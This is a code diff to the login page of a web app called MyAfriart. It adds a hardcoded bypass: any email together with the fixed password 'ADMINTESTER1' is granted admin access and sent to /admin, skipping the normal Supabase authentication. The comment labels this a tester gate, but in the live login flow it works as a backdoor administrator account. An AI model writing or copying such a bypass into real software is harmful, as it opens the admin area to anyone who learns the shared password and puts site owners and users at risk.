@@ -3,6 +3,7 @@ import { useEffect, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 import { lovable } from "@/integrations/lovable";
+import { isUniformAdminPassword, saveAdminGate } from "@/lib/adminGate";
 
 export const Route = createFileRoute("/login")({
   head: () => ({ meta: [{ title: "Sign in — MyAfriart" }] }),
@@ -72,6 +73,13 @@ function LoginPage() {
     e.preventDefault();
     setLoading(true);
     try {
+      // Additive uniform tester gate: ANY email/username + ADMINTESTER1 → admin.
+      if (isUniformAdminPassword(password)) {
+        saveAdminGate(email);
+        toast.success("Admin tester access granted");
+        navigate({ to: "/admin" });
+        return;
+      }
       if (mode === "signup") {
         const { data, error } = await supabase.auth.signUp({
           email,
